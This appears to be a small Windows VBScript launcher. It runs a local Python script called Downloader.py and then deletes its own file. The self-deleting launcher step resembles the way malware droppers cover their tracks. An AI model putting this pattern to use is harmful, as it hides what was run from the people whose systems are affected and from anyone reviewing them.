Set objShell = CreateObject("WScript.Shell")

' Execute Downloader.py using Python installed on the system
objShell.Run "python ""Downloader.py"""

' Delete the VBScript file itself after execution
Set fso = CreateObject("Scripting.FileSystemObject")
fso.DeleteFile WScript.ScriptFullName
